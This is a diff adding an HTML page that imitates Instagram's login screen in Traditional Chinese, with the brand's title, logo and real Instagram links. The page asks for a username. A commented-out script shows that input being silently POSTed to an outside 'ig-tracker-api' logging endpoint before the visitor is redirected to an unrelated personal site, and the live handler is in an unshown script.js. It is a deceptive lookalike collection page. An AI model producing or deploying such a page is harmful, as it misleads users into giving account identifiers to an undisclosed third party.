@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8" />
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="IG.png" type="image/png" />
+</head>
+<body>
+  <div class="main-container">
+    <div class="card login-box">
+      <img src="instagram-logo.png" alt="Instagram" class="logo" />
+      <input type="text" id="igInput" placeholder="用戶名稱" />
+      <button onclick="submitIG()">登入</button>
+      <div class="divider">或</div>
+      <div class="fb-login">使用 Facebook 帳號登入</div>
+      <a href="https://www.instagram.com/accounts/password/reset/" class="forgot">忘記密碼？</a>
+    </div>
+    <div class="card signup-box">
+      沒有帳號？<a href="https://www.instagram.com/accounts/emailsignup/">註冊</a>
+    </div>
+    <!-- 自訂 alert 彈窗 -->
+    <!-- <div id="alertBox" class="modal">
+      <div class="modal-content">
+        <p id="alertMessage">請輸入 IG 帳號</p>
+        <button onclick="closeAlert()">確定</button>
+      </div>
+    </div> -->
+
+  </div>
+  <script src="script.js"></script>
+  <!-- <script>
+    function submitIG() {
+      const igUsername = document.getElementById("igInput").value.trim();
+
+      if (igUsername === "") {
+        showAlert("請輸入 IG 帳號");
+        return;
+      }
+
+      fetch("https://ig-tracker-api.onrender.com/api/log", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ username: igUsername })
+      })
+      .then(res => res.json())
+      .then(data => {
+        console.log("記錄成功：", data);
+        window.location.href = "https://yunsheng0204.github.io/my-web/index.html";
+      })
+      .catch(err => {
+        showAlert("紀錄失敗，請稍後再試");
+        console.error(err);
+      });
+    }
+
+    function showAlert(msg) {
+      document.getElementById("alertMessage").textContent = msg;
+      document.getElementById("alertBox").style.display = "block";
+    }
+
+    function closeAlert() {
+      document.getElementById("alertBox").style.display = "none";
+    }
+  </script> -->
+</body>
+</html>
